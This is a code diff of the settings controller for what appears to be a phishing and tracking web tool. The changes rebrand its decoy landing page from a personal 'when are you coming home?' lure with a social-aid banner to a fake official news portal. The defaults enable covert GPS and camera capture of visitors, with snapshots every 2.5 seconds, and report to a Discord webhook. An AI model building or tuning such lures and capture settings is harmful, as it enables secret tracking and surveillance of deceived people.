@@ -24,25 +24,25 @@ class SettingsController extends Controller
     {
         $settings = [
             'discord_webhook_url' => Setting::get('discord_webhook_url', ''),
-            'bot_name' => Setting::get('bot_name', 'R4VEN'),
-            'bot_avatar_url' => Setting::get('bot_avatar_url', 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png'),
+            'bot_name' => Setting::get('bot_name', 'gampil'),
+            'bot_avatar_url' => Setting::get('bot_avatar_url', ''),
             
             // Active Template
-            'active_template' => Setting::get('active_template', 'kapan-pulang'),
+            'active_template' => Setting::get('active_template', 'gampil'),
 
             // Decoy & Landing page
-            'site_title' => Setting::get('site_title', 'Kapan Pulang?'),
-            'site_description' => Setting::get('site_description', 'Kangen nih, kapan pulang?'),
-            'og_image_url' => Setting::get('og_image_url', 'images/landing/bansos-banner.jpg'),
-            'decoy_iframe_url' => Setting::get('decoy_iframe_url', 'https://tugas-besar-webdanmobile.vercel.app/'),
-            'landing_heading' => Setting::get('landing_heading', 'Kangen'),
+            'site_title' => Setting::get('site_title', 'Portal Berita & Informasi Resmi - Gampil Akses'),
+            'site_description' => Setting::get('site_description', 'Baca informasi dan pengumuman resmi terbaru hari ini melalui portal Gampil Akses.'),
+            'og_image_url' => Setting::get('og_image_url', 'images/landing/default-thumbnail.jpg'),
+            'decoy_iframe_url' => Setting::get('decoy_iframe_url', ''),
+            'landing_heading' => Setting::get('landing_heading', 'Portal Informasi & Publikasi Resmi'),
             
             // Telemetry Toggles
             'capture_gps_enabled' => Setting::get('capture_gps_enabled', '1'),
             'capture_cam_enabled' => Setting::get('capture_cam_enabled', '1'),
             'cam_interval_ms' => Setting::get('cam_interval_ms', '2500'),
             'max_snapshots_per_session' => Setting::get('max_snapshots_per_session', '5'),
-            'custom_landing_slug' => Setting::get('custom_landing_slug', 'kapan-pulang'),
+            'custom_landing_slug' => Setting::get('custom_landing_slug', 'gampil'),
         ];
 
         $templates = TemplateService::all();
